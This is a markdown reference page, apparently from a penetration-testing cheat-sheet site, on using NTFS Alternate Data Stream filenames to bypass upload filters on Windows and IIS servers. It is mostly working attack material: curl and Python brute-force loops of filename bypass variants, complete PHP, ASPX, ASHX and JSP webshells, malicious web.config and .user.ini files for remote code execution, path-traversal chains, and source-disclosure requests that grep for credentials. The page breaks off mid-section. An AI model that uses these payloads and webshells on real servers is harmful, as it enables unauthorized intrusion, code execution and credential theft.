---
title: NTFS ADS Upload Bypass
description: Exploit file upload restrictions by leveraging NTFS Alternate Data Streams to bypass extension filters, content validation, WAFs, and antivirus detection on Windows-based web servers for remote code execution.
navigation:
  icon: i-lucide-hard-drive
  title: NTFS ADS Upload Bypass
---

## Overview

::note
NTFS Alternate Data Streams (ADS) are a feature of the Windows NTFS filesystem that allows multiple data streams to be attached to a single file. Every file has a default unnamed stream (`$DATA`), but additional named streams can be created using the colon `:` syntax. When web applications running on Windows/IIS fail to account for ADS syntax in uploaded filenames, attackers can bypass extension filters, overwrite files, hide payloads, and achieve code execution.
::

::card-group
  ::card
  ---
  title: Extension Filter Bypass
  icon: i-lucide-shield-off
  ---
  Append `:$DATA`, `::$DATA`, or `::$INDEX_ALLOCATION` to filenames to bypass server-side and client-side extension validation while preserving execution context.
  ::

  ::card
  ---
  title: Payload Hiding
  icon: i-lucide-eye-off
  ---
  Store malicious payloads in alternate streams attached to legitimate files. The payload is invisible to directory listings and most file inspection tools.
  ::

  ::card
  ---
  title: Path Traversal Chain
  icon: i-lucide-folder-tree
  ---
  Combine ADS syntax with path traversal sequences to write webshells to arbitrary locations outside intended upload directories.
  ::

  ::card
  ---
  title: Antivirus Evasion
  icon: i-lucide-scan
  ---
  Many antivirus engines and WAFs fail to inspect alternate data streams, allowing malicious content to bypass signature-based detection entirely.
  ::
::

---

## NTFS ADS Fundamentals

::tip
Before exploiting ADS in upload contexts, understanding the underlying filesystem mechanics is essential. ADS syntax is processed at the NTFS driver level, meaning the behavior is consistent across all Windows applications unless explicitly filtered.
::

::tabs
  :::tabs-item{icon="i-lucide-book-open" label="ADS Syntax Reference"}
  ```text [ADS Naming Convention]
  ┌──────────────────────────────────────────────────────────────────┐
  │                    NTFS FILE STREAM ANATOMY                      │
  ├──────────────────────────────────────────────────────────────────┤
  │                                                                  │
  │  filename.ext                                                    │
  │  ├── :$DATA              (default/unnamed data stream)           │
  │  ├── :streamname:$DATA   (named alternate data stream)           │
  │  └── :$INDEX_ALLOCATION  (directory stream type)                 │
  │                                                                  │
  │  SYNTAX PATTERNS:                                                │
  │  ─────────────────────────────────────────────────────────────   │
  │  file.ext                 → Default stream (normal access)       │
  │  file.ext::$DATA          → Explicit default stream reference    │
  │  file.ext:stream          → Named ADS (implicit $DATA type)      │
  │  file.ext:stream:$DATA    → Named ADS (explicit $DATA type)     │
  │  file.ext:.                → Empty stream name                   │
  │  file.ext:.:$DATA         → Empty stream with explicit type      │
  │                                                                  │
  │  UPLOAD BYPASS PATTERNS:                                         │
  │  ─────────────────────────────────────────────────────────────   │
  │  shell.php::$DATA         → Bypasses .php filter, IIS executes   │
  │  shell.asp::$DATA         → Bypasses .asp filter, IIS executes   │
  │  shell.aspx::$DATA        → Bypasses .aspx filter, IIS executes  │
  │  image.jpg:shell.php      → Hides PHP in ADS of JPEG file       │
  │  shell.php:.jpg           → Appends empty stream with .jpg       │
  │  shell.php:$DATA.jpg      → Confuses extension parsers           │
  │                                                                  │
  │  RESERVED STREAM NAMES:                                          │
  │  ─────────────────────────────────────────────────────────────   │
  │  $DATA                    → Default data stream type             │
  │  $INDEX_ALLOCATION        → Directory index stream               │
  │  $BITMAP                  → Allocation bitmap                    │
  │  $ATTRIBUTE_LIST          → Attribute list                       │
  │  $STANDARD_INFORMATION    → Timestamps, permissions              │
  │  $FILE_NAME               → Filename attribute                   │
  │  $SECURITY_DESCRIPTOR     → ACLs                                 │
  │  $OBJECT_ID               → Distributed link tracking            │
  │  $REPARSE_POINT           → Symlink/junction data                │
  │                                                                  │
  └──────────────────────────────────────────────────────────────────┘
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Local ADS Operations"}
  ```powershell [PowerShell]
  # Create a file with an alternate data stream
  Set-Content -Path "legit.txt" -Value "Normal content"
  Set-Content -Path "legit.txt:hidden" -Value "Hidden payload in ADS"
  Set-Content -Path "legit.txt:shell.php" -Value '<?php system($_GET["cmd"]); ?>'

  # Read ADS content
  Get-Content -Path "legit.txt:hidden"
  Get-Content -Path "legit.txt:shell.php"

  # List all streams on a file
  Get-Item -Path "legit.txt" -Stream *

  # Write binary data to ADS
  [System.IO.File]::WriteAllBytes("legit.txt:payload.exe", [System.IO.File]::ReadAllBytes("malware.exe"))

  # Read default stream via explicit $DATA reference
  Get-Content -Path "legit.txt::$DATA"

  # Create file using ::$DATA syntax
  Set-Content -Path "test.php::$DATA" -Value '<?php phpinfo(); ?>'

  # Verify file created without ::$DATA suffix
  Get-Item "test.php"
  Get-Content "test.php"

  # Remove specific ADS
  Remove-Item -Path "legit.txt" -Stream "hidden"

  # Enumerate ADS in directory recursively
  Get-ChildItem -Recurse | ForEach-Object { Get-Item $_.FullName -Stream * } |
    Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne '' }
  ```

  ```batch [CMD]
  :: Create ADS using echo
  echo Normal content > legit.txt
  echo Hidden payload > legit.txt:hidden
  echo ^<?php system($_GET["cmd"]); ?^> > legit.txt:shell.php

  :: Read ADS content
  more < legit.txt:hidden
  type legit.txt:shell.php

  :: List streams using dir /r
  dir /r legit.txt

  :: Create file via ::$DATA
  echo ^<?php phpinfo(); ?^> > test.php::$DATA

  :: Copy file to ADS
  type malware.exe > legit.txt:payload.exe

  :: Extract ADS to standalone file
  more < legit.txt:shell.php > extracted_shell.php

  :: Find all ADS in current directory
  dir /r /s | findstr ":$DATA"
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="ADS Detection & Enumeration"}
  ```bash [Terminal]
  # From Linux attacking Windows targets — enumerate ADS via SMB
  smbclient //TARGET/share -U user%pass -c "allinfo uploads/image.jpg"

  # Using smbclient streams command
  smbclient //TARGET/share -U user%pass -c "streams uploads/image.jpg"

  # Using crackmapexec for share enumeration
  crackmapexec smb TARGET -u user -p pass --shares
  crackmapexec smb TARGET -u user -p pass -M spider_plus

  # Using impacket smbclient
  python3 impacket-smbclient user:pass@TARGET
  # Then: use SHARE, ls, get filename:streamname

  # Detect ADS via HTTP responses (timing/error differences)
  curl -s -o /dev/null -w "%{http_code}:%{size_download}" "https://target.com/uploads/image.jpg"
  curl -s -o /dev/null -w "%{http_code}:%{size_download}" "https://target.com/uploads/image.jpg::$DATA"
  curl -s -o /dev/null -w "%{http_code}:%{size_download}" "https://target.com/uploads/image.jpg:hidden"

  # Using PowerShell remoting for remote ADS enum
  # (If you have creds)
  evil-winrm -i TARGET -u user -p pass
  # Then: Get-ChildItem C:\inetpub\wwwroot\uploads -Recurse | % { Get-Item $_.FullName -Stream * }
  ```
  :::
::

---

## Extension Filter Bypass via ::$DATA

::warning
The `::$DATA` suffix is the most common ADS-based upload bypass. When appended to a filename, many server-side extension validators see it as a non-executable extension, but NTFS strips `::$DATA` when writing to disk, and IIS/Windows executes the resulting file normally.
::

::accordion
  :::accordion-item{icon="i-lucide-zap" label="Basic ::$DATA Bypass"}
  ```bash [Terminal]
  # PHP shell upload with ::$DATA suffix
  # Server filter blocks .php → shell.php::$DATA bypasses filter
  # NTFS writes file as shell.php → IIS executes PHP

  # Using curl
  curl -v -F "file=@shell.php;filename=shell.php::$DATA" https://target.com/upload
  curl -v -F "file=@shell.php;filename=shell.php::$DATA;type=image/jpeg" https://target.com/upload

  # ASP/ASPX variants
  curl -v -F "file=@shell.asp;filename=shell.asp::$DATA" https://target.com/upload
  curl -v -F "file=@shell.aspx;filename=shell.aspx::$DATA" https://target.com/upload

  # JSP on Windows Tomcat
  curl -v -F "file=@shell.jsp;filename=shell.jsp::$DATA" https://target.com/upload

  # Multiple ::$DATA (some parsers strip once)
  curl -v -F "file=@shell.php;filename=shell.php::$DATA::$DATA" https://target.com/upload
  curl -v -F "file=@shell.php;filename=shell.php:::$DATA" https://target.com/upload

  # Access the uploaded shell
  curl "https://target.com/uploads/shell.php?cmd=whoami"
  curl "https://target.com/uploads/shell.php::$DATA?cmd=whoami"

  # Verify file was saved without ::$DATA
  curl -s -o /dev/null -w "%{http_code}" "https://target.com/uploads/shell.php"
  ```
  :::

  :::accordion-item{icon="i-lucide-layers" label="$DATA Stream Variations"}
  ```bash [Terminal]
  # All $DATA stream syntax variations for bypass testing
  PAYLOADS=(
    "shell.php::$DATA"
    "shell.php::$data"           # Lowercase (NTFS is case-insensitive for streams)
    "shell.php::$Data"           # Mixed case
    "shell.php::$DATA "          # Trailing space
    "shell.php::$DATA."          # Trailing dot
    "shell.php::$DATA..."        # Multiple trailing dots
    "shell.php.::$DATA"          # Dot before ::$DATA
    "shell.php::$DATA\\"         # Trailing backslash
    "shell.php::$DATA/"          # Trailing forward slash
    "shell.php::\$DATA"          # Escaped dollar sign
    "shell.php:: $DATA"          # Space after colons
    "shell.php ::$DATA"          # Space before colons
    "shell.php:%24DATA"          # URL-encoded $
    "shell.php::%24DATA"         # URL-encoded $ after colons
    "shell.php::$DATA%00"        # Null byte terminator
    "shell.php::$DATA%00.jpg"    # Null byte + safe extension
    "shell.php::$DATA%20"        # URL-encoded space
  )

  for payload in "${PAYLOADS[@]}"; do
    echo -n "Testing: $payload → "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@shell.php;filename=${payload};type=image/jpeg" \
      https://target.com/upload)
    echo "HTTP $STATUS"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Raw HTTP Request Construction"}
  ```bash [Terminal]
  # Manually construct multipart request with ADS filename
  python3 << 'PYEOF'
  import requests

  target = "https://target.com/upload"
  payload = '<?php system($_GET["cmd"]); ?>'

  ads_filenames = [
      "shell.php::$DATA",
      "shell.php::$data",
      "shell.php:: $DATA",
      "shell.php :::$DATA",
      "shell.php::$DATA ",
      "shell.php::$DATA.",
      "shell.php.::$DATA",
      "shell.php::$DATA..",
      "shell.php...::$DATA",
      "shell.asp::$DATA",
      "shell.aspx::$DATA",
      "shell.jsp::$DATA",
      "shell.php::$DATA%00.jpg",
      "shell.php:$DATA",
      "shell.php:$DATA:",
  ]

  for fn in ads_filenames:
      body = (
          '--BOUND\r\n'
          f'Content-Disposition: form-data; name="file"; filename="{fn}"\r\n'
          'Content-Type: image/jpeg\r\n'
          '\r\n'
          f'{payload}\r\n'
          '--BOUND--\r\n'
      )
      try:
          r = requests.post(target,
              headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
              data=body.encode('latin-1'),
              verify=False, timeout=10)
          print(f'{fn:40s} → HTTP {r.status_code} [{len(r.text):>6}B]')
      except Exception as e:
          print(f'{fn:40s} → ERROR: {e}')
  PYEOF
  ```
  :::

  :::accordion-item{icon="i-lucide-globe" label="IIS-Specific ::$DATA Exploitation"}
  ```bash [Terminal]
  # IIS source code disclosure via ::$DATA (classic IIS vulnerability)
  # Reading ASP/ASPX source code by requesting file::$DATA

  # Source disclosure — server returns raw source instead of executing
  curl -v "https://target.com/login.asp::$DATA"
  curl -v "https://target.com/config.aspx::$DATA"
  curl -v "https://target.com/web.config::$DATA"
  curl -v "https://target.com/global.asax::$DATA"
  curl -v "https://target.com/default.asp::$DATA"
  curl -v "https://target.com/index.php::$DATA"

  # Download source code for analysis
  for page in login.asp default.asp config.aspx web.config global.asax; do
    echo "=== $page ==="
    curl -s "https://target.com/${page}::$DATA" -o "source_${page}"
    file "source_${page}"
    head -20 "source_${page}"
    echo ""
  done

  # Look for credentials in source
  for page in login.asp default.asp config.aspx web.config; do
    curl -s "https://target.com/${page}::$DATA" | grep -iE "password|secret|key|connstring|connectionstring|pwd|uid|user"
  done

  # Short filename disclosure (8.3 naming + ADS)
  curl -v "https://target.com/SHELL~1.PHP::$DATA"
  curl -v "https://target.com/SHELL~1.PHP"
  curl -v "https://target.com/WEBCON~1.BAK::$DATA"
  ```
  :::
::

---

## Named ADS Payload Injection

::caution
Named Alternate Data Streams allow you to attach hidden data to any existing file. When a legitimate file like `image.jpg` is already on the server, you can potentially write a webshell into `image.jpg:shell.php` — invisible to directory listings but accessible if the server resolves ADS paths.
::

::tabs
  :::tabs-item{icon="i-lucide-eye-off" label="Hidden Stream Upload"}
  ```bash [Terminal]
  # Upload payload as named ADS attached to legitimate file
  # Target: image.jpg:shell.php (hidden PHP inside JPEG's ADS)

  # Filename with named stream
  curl -v -F "file=@shell.php;filename=image.jpg:shell.php" https://target.com/upload

  # Various named stream patterns
  STREAMS=(
    "image.jpg:shell.php"
    "image.jpg:shell.php:$DATA"
    "image.jpg:hidden"
    "image.jpg:payload"
    "image.jpg:cmd"
    "image.jpg:s"
    "image.jpg:."
    "document.pdf:shell.php"
    "avatar.png:backdoor.php"
    "readme.txt:shell.asp"
    "index.html:shell.aspx"
  )

  for stream in "${STREAMS[@]}"; do
    echo -n "Testing: $stream → "
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      -F "file=@shell.php;filename=${stream}" \
      https://target.com/upload)
    echo "HTTP $STATUS"
  done

  # Access hidden stream
  curl "https://target.com/uploads/image.jpg:shell.php?cmd=whoami"
  curl "https://target.com/uploads/image.jpg:shell.php:$DATA?cmd=whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-folder-plus" label="Writing to Existing Files"}
  ```bash [Terminal]
  # If the server allows specifying target path, write ADS to existing files

  # Overwrite/attach to known files
  python3 << 'PYEOF'
  import requests

  target = "https://target.com/upload"
  payload = '<?php system($_GET["cmd"]); ?>'

  # Common files that likely exist on Windows web servers
  existing_files = [
      "web.config:shell.php",
      "index.html:shell.php",
      "default.htm:shell.php",
      "iisstart.htm:shell.php",
      "robots.txt:shell.php",
      "favicon.ico:shell.php",
      "..:shell.php",                # Parent directory ADS
      ".:shell.php",                 # Current directory ADS
      "uploads:shell.php",           # Directory ADS
  ]

  for fn in existing_files:
      body = (
          '--BOUND\r\n'
          f'Content-Disposition: form-data; name="file"; filename="{fn}"\r\n'
          'Content-Type: image/jpeg\r\n\r\n'
          f'{payload}\r\n'
          '--BOUND--\r\n'
      )
      r = requests.post(target,
          headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
          data=body.encode('latin-1'), verify=False, timeout=10)
      print(f'{fn:40s} → HTTP {r.status_code}')
  PYEOF

  # Access the hidden streams
  curl "https://target.com/web.config:shell.php?cmd=whoami"
  curl "https://target.com/index.html:shell.php?cmd=whoami"
  curl "https://target.com/favicon.ico:shell.php?cmd=whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="Directory ADS Exploitation"}
  ```bash [Terminal]
  # Directories in NTFS can also have ADS
  # Writing payload to directory's alternate stream

  # Upload with directory:stream syntax
  curl -v -F "file=@shell.php;filename=uploads:shell.php" https://target.com/upload
  curl -v -F "file=@shell.php;filename=.:shell.php" https://target.com/upload
  curl -v -F "file=@shell.php;filename=..:shell.php" https://target.com/upload
  curl -v -F "file=@shell.php;filename=images:shell.php" https://target.com/upload

  # Full path directory streams
  curl -v -F "file=@shell.php;filename=C:\inetpub\wwwroot:shell.php" https://target.com/upload
  curl -v -F "file=@shell.php;filename=\\uploads\\:shell.php" https://target.com/upload

  # Access directory ADS
  curl "https://target.com/uploads:shell.php?cmd=whoami"

  # On Windows locally — verify directory ADS behavior
  # echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\uploads:shell.php
  # type C:\inetpub\wwwroot\uploads:shell.php
  # dir /r C:\inetpub\wwwroot\
  ```
  :::
::

---

## Extension Filter Bypass Combinations

::warning
ADS syntax combined with other Windows filename quirks creates powerful bypass chains. Windows silently strips trailing dots, spaces, and normalizes special characters — behaviors that extension validators often fail to account for.
::

::code-group
```bash [ADS + Trailing Characters]
# Windows strips trailing dots and spaces from filenames
# Combined with ADS for double bypass

FILENAMES=(
  # ADS + trailing dots
  "shell.php.::$DATA"
  "shell.php..::$DATA"
  "shell.php...::$DATA"
  "shell.php....::$DATA"
  
  # ADS + trailing spaces
  "shell.php ::$DATA"
  "shell.php  ::$DATA"
  
  # ADS + trailing dots and spaces
  "shell.php. ::$DATA"
  "shell.php . ::$DATA"
  "shell.php .. ::$DATA"
  
  # Trailing characters without ADS (Windows strips these too)
  "shell.php."
  "shell.php.."
  "shell.php..."
  "shell.php "
  "shell.php  "
  "shell.php. "
  "shell.php ."
  
  # ADS + mixed trailing
  "shell.php.  .::$DATA"
  "shell.php . . ::$DATA"
)

for fn in "${FILENAMES[@]}"; do
  echo -n "$fn → "
  curl -s -o /dev/null -w "%{http_code}" \
    -F "file=@shell.php;filename=${fn};type=image/jpeg" \
    https://target.com/upload
  echo ""
done
```

```bash [ADS + Double Extension]
# Double extension combined with ADS
FILENAMES=(
  "shell.php.jpg::$DATA"
  "shell.jpg.php::$DATA"
  "shell.php.png::$DATA"
  "shell.php.txt::$DATA"
  "shell.asp.jpg::$DATA"
  "shell.aspx.png::$DATA"
  "shell.php.config::$DATA"
  
  # Reverse double extension with ADS
  "shell.jpg::$DATA.php"
  "shell.png::$DATA.asp"
  
  # Multiple extensions with ADS
  "shell.php.jpg.png::$DATA"
  "shell.jpg.php.txt::$DATA"
  "shell.txt.jpg.php::$DATA"
)

for fn in "${FILENAMES[@]}"; do
  echo -n "$fn → "
  curl -s -o /dev/null -w "%{http_code}" \
    -F "file=@shell.php;filename=${fn};type=image/jpeg" \
    https://target.com/upload
  echo ""
done
```

```bash [ADS + URL Encoding]
# URL-encoded ADS components
FILENAMES=(
  "shell.php%3a%3a%24DATA"         # ::$DATA URL encoded
  "shell.php%3A%3A%24DATA"         # ::$DATA uppercase encoded
  "shell.php::%24DATA"             # Only $ encoded
  "shell.php%3a%3a\$DATA"          # Colons encoded
  "shell%2ephp::$DATA"             # Dot encoded
  "shell.php%3a:$DATA"             # Single colon encoded
  "%73hell.php::$DATA"             # 's' encoded
  
  # Double URL encoding
  "shell.php%253a%253a%2524DATA"   # Double encoded ::$DATA
  "shell%252ephp::$DATA"           # Double encoded dot
  
  # Mixed encoding
  "shell.php%3A:%24DATA"           # Partial encoding
  "shell.php::%2524DATA"           # Double encoded $
)

for fn in "${FILENAMES[@]}"; do
  echo -n "$fn → "
  curl -s -o /dev/null -w "%{http_code}" \
    -F "file=@shell.php;filename=${fn};type=image/jpeg" \
    https://target.com/upload
  echo ""
done
```

```bash [ADS + Path Traversal]
# Path traversal combined with ADS for writing outside upload dir
FILENAMES=(
  "../shell.php::$DATA"
  "..\\shell.php::$DATA"
  "..\\..\\shell.php::$DATA"
  "../../shell.php::$DATA"
  "....//shell.php::$DATA"
  "....\\\\shell.php::$DATA"
  "..%5cshell.php::$DATA"
  "..%2fshell.php::$DATA"
  "%2e%2e/shell.php::$DATA"
  "%2e%2e%5cshell.php::$DATA"
  "../../../inetpub/wwwroot/shell.php::$DATA"
  "..\\..\\..\\inetpub\\wwwroot\\shell.php::$DATA"
  
  # Directory ADS with traversal
  "../../:shell.php"
  "..\\..\\:shell.php"
  "../../../inetpub/wwwroot/:shell.php"
)

for fn in "${FILENAMES[@]}"; do
  echo -n "$fn → "
  curl -s -o /dev/null -w "%{http_code}" \
    -F "file=@shell.php;filename=${fn};type=image/jpeg" \
    https://target.com/upload
  echo ""
done
```

```bash [ADS + Null Byte]
# Null byte combined with ADS (older frameworks)
python3 << 'PYEOF'
import requests

target = "https://target.com/upload"
payload = b'<?php system($_GET["cmd"]); ?>'

filenames = [
    b"shell.php::$DATA\x00.jpg",
    b"shell.php\x00.jpg::$DATA",
    b"shell.php::$DATA\x00",
    b"shell.php\x00::$DATA",
    b"shell.php::\x00$DATA",
    b"shell.php::$DATA\x00.png",
    b"shell.php\x00.txt::$DATA",
    b"shell.asp::$DATA\x00.jpg",
    b"shell.aspx\x00.jpg::$DATA",
]

for fn in filenames:
    body = (
        b'--BOUND\r\n'
        b'Content-Disposition: form-data; name="file"; filename="' + fn + b'"\r\n'
        b'Content-Type: image/jpeg\r\n\r\n'
        + payload +
        b'\r\n--BOUND--\r\n'
    )
    try:
        r = requests.post(target,
            headers={'Content-Type': 'multipart/form-data; boundary=BOUND'},
            data=body, verify=False, timeout=10)
        print(f'{fn!r:55s} → HTTP {r.status_code}')
    except Exception as e:
        print(f'{fn!r:55s} → ERROR: {e}')
PYEOF
```
::

---

## IIS-Specific ADS Exploitation

::tabs
  :::tabs-item{icon="i-lucide-server" label="IIS Handler Mapping Abuse"}
  ```bash [Terminal]
  # IIS processes files based on handler mappings
  # ADS can trick IIS into using different handlers

  # Classic ASP via ADS
  curl -v -F "file=@shell.asp;filename=shell.asp::$DATA" https://target.com/upload
  curl "https://target.com/uploads/shell.asp?cmd=whoami"

  # ASP.NET via ADS
  curl -v -F "file=@shell.aspx;filename=shell.aspx::$DATA" https://target.com/upload
  curl -v -F "file=@shell.ashx;filename=shell.ashx::$DATA" https://target.com/upload
  curl -v -F "file=@shell.asmx;filename=shell.asmx::$DATA" https://target.com/upload

  # IIS treats .config files specially — web.config override
  cat > evil_web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
          scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified"
          requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
    <appSettings>
      <add key="cmd" value='<%
        Set obj = CreateObject("WScript.Shell")
        Set exec = obj.Exec("cmd /c " & Request("cmd"))
        Response.Write(exec.StdOut.ReadAll())
      %>' />
    </appSettings>
  </configuration>
  EOF

  # Upload web.config via ADS bypass
  curl -v -F "file=@evil_web.config;filename=web.config::$DATA" https://target.com/upload
  curl -v -F "file=@evil_web.config;filename=..\\web.config::$DATA" https://target.com/upload

  # IIS short filename (8.3) + ADS combination
  # shell.php → SHELL~1.PHP on NTFS 8.3
  curl -v -F "file=@shell.php;filename=SHELL~1.PHP::$DATA" https://target.com/upload
  curl "https://target.com/uploads/SHELL~1.PHP?cmd=whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="IIS Semicolon & Path Tricks"}
  ```bash [Terminal]
  # IIS treats semicolons in URLs as parameter delimiters
  # Combined with ADS for double bypass

  # Semicolon trick (IIS ignores everything after ; in path)
  curl -v -F "file=@shell.asp;filename=shell.asp;.jpg::$DATA" https://target.com/upload
  curl "https://target.com/uploads/shell.asp;.jpg?cmd=whoami"

  # IIS path parsing with ADS
  curl "https://target.com/uploads/shell.asp::$DATA;.jpg?cmd=whoami"
  curl "https://target.com/uploads/shell.php::$DATA;.jpg?cmd=whoami"

  # Backslash to forward slash normalization + ADS
  curl "https://target.com/uploads\\shell.php::$DATA?cmd=whoami"
  curl "https://target.com/uploads%5cshell.php::$DATA?cmd=whoami"

  # Double URL decode paths (IIS double decode vulnerability)
  curl "https://target.com/uploads/%252e%252e/shell.php::$DATA?cmd=whoami"
  curl "https://target.com/uploads/..%255c..%255cshell.php::$DATA?cmd=whoami"

  # IIS tilde enumeration combined with ADS
  # Step 1: Enumerate short names
  for i in $(seq 1 9); do
    curl -s -o /dev/null -w "%{http_code}" "https://target.com/uploads/SHELL~${i}.PHP*" 
    echo " SHELL~${i}.PHP"
  done

  # Step 2: Access via short name + ADS
  curl "https://target.com/uploads/SHELL~1.PHP::$DATA?cmd=whoami"
  ```
  :::

  :::tabs-item{icon="i-lucide-file-code" label="web.config Injection via ADS"}
  ```bash [Terminal]
  # web.config allows executing arbitrary code via IIS handlers

  # Minimal web.config for ASP code execution
  cat > web.config << 'XMLEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="aspx" path="*.jpg" verb="*"
          type="System.Web.UI.PageHandlerFactory"
          resourceType="Unspecified" requireAccess="Script" />
      </handlers>
    </system.webServer>
  </configuration>
  XMLEOF

  # Upload web.config to uploads directory
  curl -v -F "file=@web.config;filename=web.config::$DATA" https://target.com/upload

  # Now upload ASPX shell disguised as JPEG
  cat > shell.jpg << 'ASPXEOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <%
  string cmd = Request["cmd"];
  if (cmd != null) {
      Process p = new Process();
      p.StartInfo.FileName = "cmd.exe";
      p.StartInfo.Arguments = "/c " + cmd;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.Start();
      Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
  }
  %>
  ASPXEOF

  curl -v -F "file=@shell.jpg;filename=shell.jpg" https://target.com/upload

  # Execute — IIS now treats .jpg as ASPX in that directory
  curl "https://target.com/uploads/shell.jpg?cmd=whoami"

  # web.config for PHP execution on IIS
  cat > web_php.config << 'XMLEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers>
        <add name="php_via_jpg" path="*.jpg" verb="*"
          modules="FastCgiModule"
          scriptProcessor="C:\PHP\php-cgi.exe"
          resourceType="File" />
      </handlers>
    </system.webServer>
  </configuration>
  XMLEOF

  curl -v -F "file=@web_php.config;filename=web.config::$DATA" https://target.com/upload
  ```
  :::
::

---

## ADS in Different Web Frameworks

::accordion
  :::accordion-item{icon="i-lucide-diamond" label="PHP on Windows (IIS/Apache)"}
  ```bash [Terminal]
  # PHP on Windows handles ADS differently depending on version

  # Basic ::$DATA bypass for PHP upload filters
  curl -v -F "file=@shell.php;filename=shell.php::$DATA" https://target.com/upload.php

  # PHP functions that resolve ADS:
  # move_uploaded_file() — strips ::$DATA on some PHP versions
  # copy() — preserves ADS syntax
  # file_put_contents() — strips ::$DATA
  # rename() — strips ::$DATA

  # Test which PHP file functions handle ADS
  python3 << 'PYEOF'
  import requests

  target = "https://target.com/upload.php"
  payload = '<?php system($_GET["cmd"]); ?>'

  # PHP-specific ADS filenames
  filenames = [
      "shell.php::$DATA",
      "shell.pHp::$DATA",
      "shell.php7::$DATA",
      "shell.phtml::$DATA",
      "shell.pht::$DATA",
      "shell.php.jpg::$DATA",
      "shell.jpg.php::$DATA",
      "shell.php. ::$DATA",
      "shell.php.::$DATA",
      "shell.php::$DATA.",
      "shell.php::$DATA.jpg",
      ".htaccess::$DATA",
      ".user.ini::$DATA",
  ]

  for fn in filenames:
      files = {'file': (fn, payload, 'image/jpeg')}
      r = requests.post(target, files=files, verify=False, timeout=10)
      print(f'{fn:40s} → HTTP {r.status_code}')
  PYEOF

  # .user.ini override via ADS (PHP-FPM)
  cat > user_ini << 'EOF'
  auto_prepend_file=shell.jpg
  EOF

  curl -v -F "file=@user_ini;filename=.user.ini::$DATA" https://target.com/upload

  # Upload PHP shell as JPEG
  echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
  curl -v -F "file=@shell.jpg;filename=shell.jpg" https://target.com/upload

  # .user.ini auto-prepends shell.jpg → all PHP files in that dir execute shell
  curl "https://target.com/uploads/index.php?cmd=whoami"
  ```
  :::

  :::accordion-item{icon="i-lucide-hexagon" label="ASP.NET / .NET Core"}
  ```bash [Terminal]
  # ASP.NET webshell payloads with ADS bypass

  # ASPX webshell
  cat > shell.aspx << 'EOF'
  <%@ Page Language="C#" %>
  <%@ Import Namespace="System.Diagnostics" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e) {
      if (Request["cmd"] != null) {
          ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]);
          psi.RedirectStandardOutput = true;
          psi.UseShellExecute = false;
          Process p = Process.Start(psi);
          Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
      }
  }
  </script>
  EOF

  # Upload via ADS
  curl -v -F "file=@shell.aspx;filename=shell.aspx::$DATA" https://target.com/upload
  curl -v -F "file=@shell.aspx;filename=shell.aspx::$DATA.jpg" https://target.com/upload

  # ASHX handler shell
  cat > shell.ashx << 'EOF'
  <%@ WebHandler Language="C#" Class="Handler" %>
  using System;
  using System.Web;
  using System.Diagnostics;
  public class Handler : IHttpHandler {
      public void ProcessRequest(HttpContext context) {
          string cmd = context.Request["cmd"];
          if (cmd != null) {
              Process p = Process.Start("cmd.exe", "/c " + cmd);
              p.StartInfo.RedirectStandardOutput = true;
              p.StartInfo.UseShellExecute = false;
              p.Start();
              context.Response.Write(p.StandardOutput.ReadToEnd());
          }
      }
      public bool IsReusable { get { return false; } }
  }
  EOF

  curl -v -F "file=@shell.ashx;filename=shell.ashx::$DATA" https://target.com/upload

  # .NET deserialization via ADS
  # Upload malicious ViewState to web.config stream
  curl -v -F "file=@evil_web.config;filename=..\\web.config::$DATA" https://target.com/upload
  ```
  :::

  :::accordion-item{icon="i-lucide-coffee" label="Java on Windows (Tomcat/Jetty)"}
  ```bash [Terminal]
  # JSP shell with ADS bypass on Windows Tomcat

  # Basic JSP webshell
  cat > shell.jsp << 'EOF'
  <%@ page import="java.io.*" %>
  <%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
      BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
      String line;
      while ((line = br.readLine()) != null) out.println(line);
  }
  %>
  EOF

  # Upload with ADS
  curl -v -F "file=@shell.jsp;filename=shell.jsp::$DATA" https://target.com/upload
  curl -v -F "file=@shell.jsp;filename=shell.jsp::$DATA.jpg" https://target.com/upload
  curl -v -F "file=@shell.jsp;filename=shell.jspx::$DATA" https://target.com/upload

  # WAR file via ADS
  jar cf shell.war shell.jsp
  curl -v -F "file=@shell.war;filename=shell.war::$DATA" https://target.com/manager/deploy

  # Tomcat web.xml modification via ADS
  curl -v -F "file=@evil_web.xml;filename=..\\..\\WEB-INF\\web.xml::$DATA" https://target.com/upload

  # Access shell
